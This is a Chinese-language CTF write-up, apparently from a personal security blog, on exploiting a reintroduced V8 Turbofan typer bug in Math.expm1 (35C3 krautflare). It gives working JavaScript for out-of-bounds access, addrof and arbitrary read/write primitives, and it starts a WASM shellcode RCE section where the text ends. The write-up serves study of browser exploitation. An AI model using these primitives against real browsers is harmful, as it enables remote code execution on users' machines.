<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>35C3 CTF krautflare exploit | 7o8v&#39;s blog</title>
  <meta name="keywords" content=" Browser , JavascriptEngine , Chrome , V8 ">
  <meta name="description" content="35C3 CTF krautflare exploit | 7o8v&#39;s blog">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="Syclover Binary security researcher 成都信息工程大学">
<meta name="keywords" content="binary">
<meta property="og:type" content="website">
<meta property="og:title" content="About 7o8v">
<meta property="og:url" content="http:&#x2F;&#x2F;www.7o8v.me&#x2F;about&#x2F;index.html">
<meta property="og:site_name" content="7o8v&#39;s blog">
<meta property="og:description" content="Syclover Binary security researcher 成都信息工程大学">
<meta property="og:locale" content="en">
<meta property="og:updated_time" content="2019-10-30T06:51:10.899Z">
<meta name="twitter:card" content="summary">


<link rel="icon" href="/img/avatar.jpg">

<link href="/css/style.css?v=1.0.1" rel="stylesheet">

<link href="/css/hl_theme/sublime.css?v=1.0.1" rel="stylesheet">

<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>

<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>



<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>

<script src="/js/iconfont.js?v=1.0.1" ></script>

</head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="false">
  <input class="theme_blog_path" value="">
</div>

<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/" class="avatar_target">
    <img class="avatar" src="/img/avatar.jpg" />
</a>
<div class="author">
    <span>7o8v</span>
</div>

<div class="icon">
    
        
        <a title="github" href="https://github.com/joshua7o8v" target="_blank">
            
                <svg class="iconfont-svg" aria-hidden="true">
                    <use xlink:href="#icon-github"></use>
                </svg>
            
        </a>
        
    
        
        <a title="email" href="mailto:269134615@qq.com" target="_blank">
            
                <svg class="iconfont-svg" aria-hidden="true">
                    <use xlink:href="#icon-email"></use>
                </svg>
            
        </a>
        
    
</div>




<ul>
    <li><div class="all active">全部文章<small>(5)</small></div></li>
    
</ul>
<div class="left-bottom">
    <div class="menus">
    
    
    
    
    </div>
    <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="5">

<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        友情链接
        <i class="back-title-list"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="http://redteam.today/">cl0und</a></li>
            
            <li><a target="_blank" href="https://evoa.me/">evoa</a></li>
            
            <li><a target="_blank" href="http://kkdlong.win/">kkdlong</a></li>
            
            <li><a target="_blank" href="https://blog.l0ca1.xyz/">l0ca1</a></li>
            
            <li><a target="_blank" href="http://abcdefghijklmnopqrst.xyz/">骑麦兜看落日</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <form onkeydown="if(event.keyCode==13){return false;}">
        <input class="search" type="text" placeholder="以 in: 开头进行全文搜索" autocomplete="off"id="local-search-input" >
        <i class="cross"></i>
        <span>
            <label for="tagswitch">Tags:</label>
            <input id="tagswitch" type="checkbox" style="display: none" />
            <i id="tagsWitchIcon"></i>
        </span>
    </form>
    <div class="tags-list">
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color3">Browser</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color2">JavascriptEngine</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color2">Chrome</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color3">V8</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color5">JavascriptCore</a>
    </li>
    
    <li class="article-tag-list-item">
        <a href="javascript:" class="color2">Webkit</a>
    </li>
    
    <div class="clearfix"></div>
</div>

    
    <div id="local-search-result">

    </div>
    
    <nav id="title-list-nav">
        
        <a  class=""
           href="/2019/10/30/35C3-CTF-krautflare-exploit/"
           data-tag="Browser,JavascriptEngine,Chrome,V8"
           data-author="" >
            <span class="post-title" title="35C3 CTF krautflare exploit">35C3 CTF krautflare exploit</span>
            <span class="post-date" title="2019-10-30 19:33:13">2019/10/30</span>
        </a>
        
        <a  class=""
           href="/2019/10/30/Javascript-engine-exploit-1/"
           data-tag="Browser,JavascriptEngine,JavascriptCore,Webkit"
           data-author="" >
            <span class="post-title" title="Javascript engine exploit 1">Javascript engine exploit 1</span>
            <span class="post-date" title="2019-10-30 14:19:27">2019/10/30</span>
        </a>
        
        <a  class=""
           href="/2019/10/30/Javascript-engine-exploit-2/"
           data-tag="Browser,JavascriptEngine,JavascriptCore,Webkit"
           data-author="" >
            <span class="post-title" title="Javascript engine exploit 2">Javascript engine exploit 2</span>
            <span class="post-date" title="2019-10-30 15:49:07">2019/10/30</span>
        </a>
        
        <a  class=""
           href="/2019/10/30/Javascript-engine-exploit-3/"
           data-tag="Browser,JavascriptEngine,JavascriptCore,Webkit"
           data-author="" >
            <span class="post-title" title="Javascript engine exploit 3">Javascript engine exploit 3</span>
            <span class="post-date" title="2019-10-30 15:49:10">2019/10/30</span>
        </a>
        
        <a  class=""
           href="/2019/10/30/V8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"
           data-tag="Browser,JavascriptEngine,Chrome,V8"
           data-author="" >
            <span class="post-title" title="V8调试环境搭建">V8调试环境搭建</span>
            <span class="post-date" title="2019-10-30 18:36:34">2019/10/30</span>
        </a>
        
    </nav>
</div>
    </div>
    <div class="hide-list">
        <div class="semicircle">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div class="post">
    <div class="pjax">
        <article id="post-35C3-CTF-krautflare-exploit" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">35C3 CTF krautflare exploit</h1>
    
    <div class="article-meta">
        
        
        
        
        <span class="tag">
            
            <a href="javascript:" class="color3">Browser</a>
            
            <a href="javascript:" class="color2">JavascriptEngine</a>
            
            <a href="javascript:" class="color2">Chrome</a>
            
            <a href="javascript:" class="color3">V8</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
        创建时间:<time class="date" title='更新时间: 2019-10-30 19:37:54'>2019-10-30 19:33</time>
        
    </div>
    <div class="article-meta">
        
        
        <span id="busuanzi_container_page_pv">
            阅读:<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trigger"><span class="toc-text">Trigger</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OOB"><span class="toc-text">OOB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OOB-RW"><span class="toc-text">OOB RW</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Addrof"><span class="toc-text">Addrof()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Arbitrary-Read-Write"><span class="toc-text">Arbitrary Read/Write</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RCE"><span class="toc-text">RCE</span></a></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>这是一个根据v8去年的<code>Math.expm1()</code>的bug改编出来的题目，题目下载地址：<a href="https://35c3ctf.ccc.ac/uploads/krautflare-33ce1021f2353607a9d4cc0af02b0b28.tar" target="_blank" rel="noopener">https://35c3ctf.ccc.ac/uploads/krautflare-33ce1021f2353607a9d4cc0af02b0b28.tar</a></p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>project zero关于这个bug的描述：<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1710" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1710</a></p>
<p>造成这个bug的主要原因就是typer将<code>Math.expm1()</code>方法返回的type设置为了<code>Union(PlainNumber, NaN)</code>，这其实就忽略了<code>-0</code>，在V8中，0和-0其实并不完全一样。</p>
<p>可以用以下代码测试：</p>
<pre><code class="javascript">d8&gt; Object.is(0, -0)
false
d8&gt; </code></pre>
<p>-0实际上属于浮点数：</p>
<pre><code class="javascript">d8&gt; %DebugPrint(-0)
DebugPrint: -0
0x282625580561: [Map]
 - type: HEAP_NUMBER_TYPE
 - instance size: 16
 - elements kind: HOLEY_ELEMENTS
 - unused property fields: 0
 - enum length: invalid
 - stable_map
 - back pointer: 0x2826255804d1 &lt;undefined&gt;
 - prototype_validity cell: 0
 - instance descriptors (own) #0: 0x282625580259 &lt;DescriptorArray[0]&gt;
 - layout descriptor: (nil)
 - prototype: 0x2826255801d9 &lt;null&gt;
 - constructor: 0x2826255801d9 &lt;null&gt;
 - dependent code: 0x2826255802c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;
 - construction counter: 0

0
d8&gt; </code></pre>
<p>这里的<code>HEAP_NUMBER_TYPE</code>在V8中代表的就是浮点数。而<code>PlainNumber</code>在V8中表示除了-0之外的所有浮点数。也就是说typer在处理Math.expm1的时候漏掉了-0。然而实际上执行语句<code>Math.expm1(-0)</code>时会直接返回-0。可以用以下代码验证：</p>
<pre><code class="javascript">d8&gt; Object.is(Math.expm1(-0), -0)
true
d8&gt; </code></pre>
<p>再来看题目给的patch文件<code>revert-bugfix-880207.patch</code>：</p>
<pre><code class="diff">...
--- a/src/compiler/typer.cc
+++ b/src/compiler/typer.cc
@@ -1491,6 +1491,7 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
     // Unary math functions.
     case BuiltinFunctionId::kMathAbs:
     case BuiltinFunctionId::kMathExp:
+    case BuiltinFunctionId::kMathExpm1:
       return Type::Union(Type::PlainNumber(), Type::NaN(), t-&gt;zone());
     case BuiltinFunctionId::kMathAcos:
     case BuiltinFunctionId::kMathAcosh:
@@ -1500,7 +1501,6 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
     case BuiltinFunctionId::kMathAtanh:
     case BuiltinFunctionId::kMathCbrt:
     case BuiltinFunctionId::kMathCos:
-    case BuiltinFunctionId::kMathExpm1:
     case BuiltinFunctionId::kMathFround:
     case BuiltinFunctionId::kMathLog:
     case BuiltinFunctionId::kMathLog1p:
...
</code></pre>
<p>这里的patch给了我们前面提到的bug。同时题目给了一个<code>build.sh</code>，将里面的release替换为debug然后编译，方便调试。</p>
<h3 id="Trigger"><a href="#Trigger" class="headerlink" title="Trigger"></a>Trigger</h3><p>了解bug之后来尝试触发，根据前面的分析，typer认为Math.expm1只会返回PlainNumber和NaN，那么我们用-0和<code>Math.expm1(x)</code>比较就一直会返回<code>false</code>，当然，要达到这个效果，我们需要需要让JIT编译这段代码：</p>
<pre><code class="javascript">function foo(x){

    let res = Object.is(Math.expm1(x), -0);

    return res;
}

print(&quot;foo(0)  : &quot;+foo(0));
%OptimizeFunctionOnNextCall(foo);
print(&quot;foo(-0) : &quot;+foo(-0));</code></pre>
<pre><code>$ ./run.sh
foo(0)  : false
foo(-0) : true
V8 version 7.3.0 (candidate)
d8&gt; </code></pre><p>结果明显不符合预期，因为如果触发了bug的话，foo(-0)应该返回false才对。这里就是这道题目和原来bug不一样的地方了，这里可以用Turbolizer跟踪一下优化过程，运行脚本（run.sh）的命令为：</p>
<pre><code class="bash">/path/to/d8  --shell ./poc.js --allow-natives-syntax --trace-turbo</code></pre>
<p>生成json文件后用Turbolizer导入：</p>
<p><img src="/.me//1566443716450.png" alt="1566443716450"></p>
<p>直接看Simplified lowering phase，可以看到Math.expm1被替换为了Float64Expm1，这样的话typer就会对返回的type正常处理，这是我们不想看到的，所以不能让Float64Expm1被调用，于是我们可以在中间调用一个<code>foo(&quot;0&quot;)</code>，这样Turbofan就会搜集到这个信息并反馈，表示<code>foo()</code>还会接受String类型参数，然后调用更底层的<code>Call</code>来进行处理：</p>
<pre><code class="javascript">function foo(x){

    let res = Object.is(Math.expm1(x), -0);

    return res;
}

print(&quot;foo(0)  : &quot;+foo(0));
%OptimizeFunctionOnNextCall(foo);
print(&quot;foo(-0) : &quot;+foo(-0));
foo(&quot;0&quot;);
%OptimizeFunctionOnNextCall(foo);
print(&quot;foo(0)  : &quot;+foo(0));
print(&quot;foo(-0) : &quot;+foo(-0));</code></pre>
<p>这里使用两次优化的原因是要使用<code>foo(&quot;0&quot;)</code>触发负优化来让Turbofan搜集类型信息。</p>
<pre><code>$ ./run.sh
foo(0)  : false
foo(-0) : true
foo(0)  : false
foo(-0) : false
V8 version 7.3.0 (candidate)
d8&gt; 
</code></pre><p>成功返回<code>false</code>，表明typer返回的类型信息成功传递到了之后的优化阶段。</p>
<p><img src="/.me//1566444181400.png" alt="1566444181400"></p>
<p>在typer lowering phase就可以看到<code>foo()</code>的返回值直接就被替换为了<code>false</code>，成功触发bug。</p>
<h3 id="OOB"><a href="#OOB" class="headerlink" title="OOB"></a>OOB</h3><p>只让foo返回false似乎很难去利用，因为返回值被固定为了false。其实我们就可以利用这一点去触发一个OOB，因为Turbofan认为<code>Object.is(Math.expm1(x), -0)</code>一定返回false，那么我们将它转换成number的话，Turbofan也认为它一定是0（但实际上可能是1），这样的话Turbofan就会在Simple lowering phase去掉CheckBounds node，所以可以构造如下的代码：</p>
<pre><code class="javascript">function foo(x){

    let oob = [1.1, 1.2, 1.3, 1.4];
    let idx = Object.is(Math.expm1(x), -0);
    idx *= 1337;

    return oob[idx];
}

print(&quot;foo(0)  : &quot;+foo(0));
%OptimizeFunctionOnNextCall(foo);
foo(&quot;0&quot;);
%OptimizeFunctionOnNextCall(foo);
print(&quot;foo(0)  : &quot;+foo(0));
print(&quot;foo(-0) : &quot;+foo(-0));
</code></pre>
<pre><code class="javascript">$ ./run.sh
foo(0)  : 1.1
foo(0)  : 1.1
foo(-0) : 1.1
V8 version 7.3.0 (candidate)
d8&gt; 
</code></pre>
<p>出现的结果比较奇怪，不管传入0或者-0都返回的是<code>oob[0]</code>的值，这似乎说明idx也被替换为了固定值，还是用Turbolizer看下过程：</p>
<p><img src="/.me//1566453967115.png" alt="1566453967115"></p>
<p>可以看到确实没有了CheckBounds node，但是idx也被替换为了0。</p>
<p><img src="/.me//1566454367693.png" alt="1566454367693"></p>
<p>再往前面找可以发现idx被替换为0应该是从typer开始的，因为typer认为idx计算出来的范围一定是<code>Range(0, 0)</code>，所以干脆用固定值替换掉了（替换发生在下一个阶段Type lowering）。</p>
<p>现在需要寻找一种方法，能让Turbofan不那么早确定idx的值，在Simple lowering phase之前都不触发bug，而在Simple lowering phase的时候才触发，这样才能实现oob。完成这件事就是这个题目最难的部分，可以来看一下Turbofan pipeline：</p>
<p><img src="https://abiondo.me/assets/img/35c3-krautflare-pipeline.png" alt="Relevant Turbofan pipeline"></p>
<p>基于让bug迟一点触发的想法，我们可以将<code>Object.is()</code>的两个参数都变成不确定的值，于是可以构造如下代码：</p>
<pre><code class="javascript">function foo(x, y){

    let idx = Object.is(Math.expm1(x), y);
    let oob = [1.1, 1.2, 1.3, 1.4];
    idx *= 1337;

    return oob[idx];
}

print(&quot;foo(0)  : &quot;+foo(0, -0));
%OptimizeFunctionOnNextCall(foo);
foo(&quot;0&quot;, -0);
%OptimizeFunctionOnNextCall(foo);
print(&quot;foo(0)  : &quot;+foo(0, -0));
print(&quot;foo(-0) : &quot;+foo(-0, -0));
</code></pre>
<pre><code class="javascript">$ ./run.sh
foo(0)  : 1.1
foo(0)  : 1.1
foo(-0) : undefined
V8 version 7.3.0 (candidate)
d8&gt; 
</code></pre>
<p>很明显失败了，CheckBounds node没有被去除。</p>
<p><img src="/.me//1566456380856.png" alt="1566456380856"></p>
<p>Turbofan依然保留了SameValue node，说明<code>Object.is()</code>的返回值在它看来一直都是不确定的。</p>
<p>前面说到我们需要在Simple lowering phase触发bug才行，而前一个phase就是Escape Analyze，于是我们可以借助Escape Analyze来Reduce SameValue node。可以构造如下代码：</p>
<pre><code class="javascript">function foo(x){

    let aux = {mz:-0};
    let idx = Object.is(Math.expm1(x), aux.mz);
    let oob = [1.1, 1.2, 1.3, 1.4];
    idx *= 1337;

    return oob[idx];
}

print(&quot;foo(0)  : &quot;+foo(0));
%OptimizeFunctionOnNextCall(foo);
foo(&quot;0&quot;);
%OptimizeFunctionOnNextCall(foo);
print(&quot;foo(0)  : &quot;+foo(0));
print(&quot;foo(-0) : &quot;+foo(-0));
</code></pre>
<p>因为这样的话，我们访问<code>aux.mz</code>实际上Turbofan不确定<code>aux</code>和<code>aux.mz</code>的类型，然后Turbofan去检查<code>aux.mz</code>，发现是-0的固定值，于是在Escape Analyze phase开始的时候就将<code>aux.mz</code>替换为了<code>NumberConstant[-0]</code>。</p>
<p><img src="/.me//1566457213464.png" alt="1566457213464"></p>
<p>通过前面的测试我们知道idx被替换为0发生在typer阶段，而我们通过设置<code>aux.mz</code>使得idx没有被替换，但是<code>aux.mz</code>的类型信息却被Simple lowering phase使用了，并因此去掉了CheckBounds，结果就是：</p>
<pre><code class="javascript">$ ./run.sh
foo(0)  : 1.1
foo(0)  : 1.1
foo(-0) : -1.1885946300594787e+148
V8 version 7.3.0 (candidate)
d8&gt;
</code></pre>
<p>Turbofan编译出来的汇编代码如下，SameValue的返回值在0x12f偏移的位置，可以看到并没有被替换，而且没有边界检查：  </p>
<pre><code class="assembly">kind = OPTIMIZED_FUNCTION
stack_slots = 6
compiler = turbofan
address = 0x7ffe3ab73e58
Instructions (size = 596)
0x12002a1bf380     0  REX.W leaq rbx,[rip+0xfffffff9]
0x12002a1bf387     7  REX.W cmpq rbx,rcx
0x12002a1bf38a     a  jz 0x12002a1bf3a4  &lt;+0x24&gt;
0x12002a1bf38c     c  REX.W movq rdx,0x3600000000
0x12002a1bf396    16  REX.W movq r10,0x7f76547f6120  (Abort)    ;; off heap target
0x12002a1bf3a0    20  call r10
0x12002a1bf3a3    23  int3l
0x12002a1bf3a4    24  REX.W movq rbx,[rcx-0x20]
0x12002a1bf3a8    28  testb [rbx+0xf],0x1
0x12002a1bf3ac    2c  jnz 0x12002a1039c0  (CompileLazyDeoptimizedCode)    ;; code: Builtin::CompileLazyDeoptimizedCode
0x12002a1bf3b2    32  push rbp
0x12002a1bf3b3    33  REX.W movq rbp,rsp
0x12002a1bf3b6    36  push rsi
0x12002a1bf3b7    37  push rdi
0x12002a1bf3b8    38  REX.W subq rsp,0x10
0x12002a1bf3bc    3c  REX.W movq [rbp-0x18],rsi
0x12002a1bf3c0    40  REX.W cmpq rsp,[r13+0x11e8] (root (stack_limit))
0x12002a1bf3c7    47  jna 0x12002a1bf532  &lt;+0x1b2&gt;
0x12002a1bf3cd    4d  REX.W movq rdi,0x8f3c0087239    ;; object: 0x08f3c0087239 &lt;JSFunction expm1 (sfi = 0x4d5a538ff69)&gt;
0x12002a1bf3d7    57  REX.W movq rsi,[rdi+0x1f]
0x12002a1bf3db    5b  REX.W movq rax,0x8f3c0086b99    ;; object: 0x08f3c0086b99 &lt;Object map = 0x2db35a2012b9&gt;
0x12002a1bf3e5    65  push rax
0x12002a1bf3e6    66  push [rbp+0x10]
0x12002a1bf3e9    69  REX.W movq rdx,[r13-0x28] (root (undefined_value))
0x12002a1bf3ed    6d  movl rax,0x1
0x12002a1bf3f2    72  REX.W movq r10,0x7f7654908d00  (MathExpm1)    ;; off heap target
0x12002a1bf3fc    7c  call r10
0x12002a1bf3ff    7f  REX.W movq rbx,[r13+0x6bf40] (WAAT??? What are we accessing here???)
0x12002a1bf406    86  REX.W leaq rdx,[rbx+0x30]
0x12002a1bf40a    8a  REX.W cmpq [r13+0x6bf48] (WAAT??? What are we accessing here???),rdx
0x12002a1bf411    91  jna 0x12002a1bf55a  &lt;+0x1da&gt;
0x12002a1bf417    97  REX.W leaq rdx,[rbx+0x30]
0x12002a1bf41b    9b  REX.W movq [r13+0x6bf40] (WAAT??? What are we accessing here???),rdx
0x12002a1bf422    a2  REX.W addq rbx,0x1
0x12002a1bf426    a6  REX.W movq rdx,[r13+0x160] (root (fixed_double_array_map))
0x12002a1bf42d    ad  REX.W movq [rbx-0x1],rdx
0x12002a1bf431    b1  REX.W movq rdx,0x400000000
0x12002a1bf43b    bb  REX.W movq [rbx+0x7],rdx
0x12002a1bf43f    bf  REX.W movq r10,0x3ff199999999999a
0x12002a1bf449    c9  vmovq xmm0,r10
0x12002a1bf44e    ce  vmovsd [rbx+0xf],xmm0
0x12002a1bf453    d3  REX.W movq r10,0x3ff3333333333333
0x12002a1bf45d    dd  vmovq xmm0,r10
0x12002a1bf462    e2  vmovsd [rbx+0x17],xmm0
0x12002a1bf467    e7  REX.W movq r10,0x3ff4cccccccccccd
0x12002a1bf471    f1  vmovq xmm0,r10
0x12002a1bf476    f6  vmovsd [rbx+0x1f],xmm0
0x12002a1bf47b    fb  REX.W movq r10,0x3ff6666666666666
0x12002a1bf485   105  vmovq xmm0,r10
0x12002a1bf48a   10a  vmovsd [rbx+0x27],xmm0
0x12002a1bf48f   10f  REX.W movq [rbp-0x18],rbx
0x12002a1bf493   113  xorl rsi,rsi
0x12002a1bf495   115  REX.W movq rdx,rax
0x12002a1bf498   118  REX.W movq rax,0x8f3c009ed31    ;; object: 0x08f3c009ed31 &lt;HeapNumber -0&gt;
0x12002a1bf4a2   122  REX.W movq r10,0x7f7654914960  (SameValue)    ;; off heap target
0x12002a1bf4ac   12c  call r10
0x12002a1bf4af   12f  REX.W cmpq [r13-0x10] (root (true_value)),rax
0x12002a1bf4b3   133  setzl al
0x12002a1bf4b6   136  movzxbl rax,rax
0x12002a1bf4b9   139  imull rax,rax,0x539
0x12002a1bf4bf   13f  REX.W movq rbx,[rbp-0x18]
0x12002a1bf4c3   143  vmovsd xmm0,[rbx+rax*8+0xf]
0x12002a1bf4c9   149  vcvttsd2si rax,xmm0
0x12002a1bf4cd   14d  vxorpd xmm1,xmm1,xmm1
0x12002a1bf4d1   151  vcvtlsi2sd xmm1,xmm1,rax
0x12002a1bf4d5   155  vucomisd xmm1,xmm0
0x12002a1bf4d9   159  jpe 0x12002a1bf4f9  &lt;+0x179&gt;
0x12002a1bf4df   15f  jnz 0x12002a1bf4f9  &lt;+0x179&gt;
0x12002a1bf4e5   165  cmpl rax,0x0
0x12002a1bf4e8   168  jz 0x12002a1bf57d  &lt;+0x1fd&gt;
0x12002a1bf4ee   16e  REX.W shlq rax, 32
0x12002a1bf4f2   172  REX.W movq rsp,rbp
0x12002a1bf4f5   175  pop rbp
0x12002a1bf4f6   176  ret 0x10
0x12002a1bf4f9   179  REX.W movq rax,[r13+0x6bf40] (WAAT??? What are we accessing here???)
0x12002a1bf500   180  REX.W leaq rbx,[rax+0x10]
0x12002a1bf504   184  REX.W cmpq [r13+0x6bf48] (WAAT??? What are we accessing here???),rbx
0x12002a1bf50b   18b  jna 0x12002a1bf5a5  &lt;+0x225&gt;
0x12002a1bf511   191  REX.W leaq rbx,[rax+0x10]
0x12002a1bf515   195  REX.W movq [r13+0x6bf40] (WAAT??? What are we accessing here???),rbx
0x12002a1bf51c   19c  REX.W addq rax,0x1
0x12002a1bf520   1a0  REX.W movq rbx,[r13+0x80] (root (heap_number_map))
0x12002a1bf527   1a7  REX.W movq [rax-0x1],rbx
0x12002a1bf52b   1ab  vmovsd [rax+0x7],xmm0
0x12002a1bf530   1b0  jmp 0x12002a1bf4f2  &lt;+0x172&gt;
0x12002a1bf532   1b2  REX.W movq rbx,0x7f76541bddd0    ;; external reference (Runtime::StackGuard)
0x12002a1bf53c   1bc  REX.W movq rsi,0x8f3c0081749    ;; object: 0x08f3c0081749 &lt;NativeContext[249]&gt;
0x12002a1bf546   1c6  xorl rax,rax
0x12002a1bf548   1c8  REX.W movq r10,0x7f7654a790a0  (CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit)    ;; off heap target
0x12002a1bf552   1d2  call r10
0x12002a1bf555   1d5  jmp 0x12002a1bf3cd  &lt;+0x4d&gt;
0x12002a1bf55a   1da  REX.W movq [rbp-0x20],rax
0x12002a1bf55e   1de  movl rdx,0x30
0x12002a1bf563   1e3  REX.W movq r10,0x7f7654768700  (AllocateInNewSpace)    ;; off heap target
0x12002a1bf56d   1ed  call r10
0x12002a1bf570   1f0  REX.W leaq rbx,[rax-0x1]
0x12002a1bf574   1f4  REX.W movq rax,[rbp-0x20]
0x12002a1bf578   1f8  jmp 0x12002a1bf417  &lt;+0x97&gt;
0x12002a1bf57d   1fd  vmovsd [rbp-0x18],xmm0
0x12002a1bf582   202  REX.W movq [rbp-0x20],rax
0x12002a1bf586   206  movl rax,[rbp-0x14]
0x12002a1bf589   209  cmpl rax,0x0
0x12002a1bf58c   20c  jl 0x12002a1bf59b  &lt;+0x21b&gt;
0x12002a1bf592   212  REX.W movq rax,[rbp-0x20]
0x12002a1bf596   216  jmp 0x12002a1bf4ee  &lt;+0x16e&gt;
0x12002a1bf59b   21b  vmovsd xmm0,[rbp-0x18]
0x12002a1bf5a0   220  jmp 0x12002a1bf4f9  &lt;+0x179&gt;
0x12002a1bf5a5   225  vmovsd [rbp-0x18],xmm0
0x12002a1bf5aa   22a  movl rdx,0x10
0x12002a1bf5af   22f  REX.W movq r10,[rip+0xffffffaf]
0x12002a1bf5b6   236  call r10
0x12002a1bf5b9   239  REX.W subq rax,0x1
0x12002a1bf5bd   23d  vmovsd xmm0,[rbp-0x18]
0x12002a1bf5c2   242  jmp 0x12002a1bf511  &lt;+0x191&gt;
0x12002a1bf5c7   247  nop
0x12002a1bf5c8   248  call 0x12002a282040     ;; debug: deopt position, script offset &#39;65&#39;
                                                             ;; debug: deopt position, inlining id &#39;-1&#39;
                                                             ;; debug: deopt reason &#39;(unknown)&#39;
                                                             ;; debug: deopt index 0
                                                             ;; lazy deoptimization bailout 0
0x12002a1bf5cd   24d  call 0x12002a282045     ;; debug: deopt position, script offset &#39;12&#39;
                                                             ;; debug: deopt position, inlining id &#39;-1&#39;
                                                             ;; debug: deopt reason &#39;(unknown)&#39;
                                                             ;; debug: deopt index 1
                                                             ;; lazy deoptimization bailout 1
0x12002a1bf5d2   252  nop
</code></pre>
<p>虽然现在实现了oob，但是非常不稳定，需要使用这个oob来扩大和稳定对V8的控制。（这个时候就不要用前面编译出来的debug版本的v8了，直接用题目提供的版本，因为我测试的时候发现我编译出来的d8泄露出来的数据不正常）</p>
<h3 id="OOB-RW"><a href="#OOB-RW" class="headerlink" title="OOB RW"></a>OOB RW</h3><p>一个比较简单的构造稳定oob的方法就是，在原有的oob数组后面再申请一个JSArray，然后通过已有的oob修改<code>JSArray.length</code>，于是可以构造如下代码：</p>
<pre><code class="javascript">var oob_arr = undefined;
function foo(x) {

    let o = {mz: -0};
    let i = Object.is(Math.expm1(x), o.mz); // i = 0
    i *= 14; // Feedback i = 0; slot 14 is the b.length

    let a = [0.1, 0.2, 0.3, 0.4, 0.5];
    let b = [1.1, 1.2, 1.3, 1.4];
    oob_arr = b;
    a[i] = i2f(0x111100000000); // Modify length of oob_arr to make a out-of-bounds.

    return a[i];
}
</code></pre>
<h3 id="Addrof"><a href="#Addrof" class="headerlink" title="Addrof()"></a>Addrof()</h3><p>之后再在后面申请一个普通对象<code>var victim = {prop:{}};</code>，通过victim来完成<code>addrof()</code>的构造：</p>
<pre><code class="javascript">function addrof(obj){
    victim.prop = obj;
    return f2i(oob_arr[0x1f]);
}
</code></pre>
<h3 id="Arbitrary-Read-Write"><a href="#Arbitrary-Read-Write" class="headerlink" title="Arbitrary Read/Write"></a>Arbitrary Read/Write</h3><p><code>fakeobj()</code>可以不用，因为我们可以通过第二个oob直接构造出Arbitrary Read/Write，方法就是在victim后面接着再申请一个<code>ArrayBuffer</code>，然后通过oob修改<code>JSArrayBuffer.BackingStore</code>指针：</p>
<pre><code class="javascript">var arb_buf = new ArrayBuffer(0x100);

function read64(addr){

    oob_arr[0x31] = i2f(addr);
    let buf_f64 = new Float64Array(arb_buf);

    return f2i(buf_f64[0]);
}

function arb_write(addr, content){

    oob_arr[0x31] = i2f(addr);
    if(typeof content == &quot;number&quot;){
        let buf_f64 = new Float64Array(arb_buf);
        buf_f64[0] = i2f(content);
    }else if(typeof content == &quot;string&quot;){
        let buf_u8 = new Uint8Array(arb_buf);
        for(let i=0, len=content.length; i&lt;len; i++){
            buf_u8[i] = content[i].charCodeAt();
        }
    }

}
</code></pre>
<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>通过WASM构造出RWX memory，然后泄露出RWX memory的地址再写入shellcode就可以很轻松地RCE：</p>
<pre><code class="javascript">var pwn = {

    getRWXMem : function(){
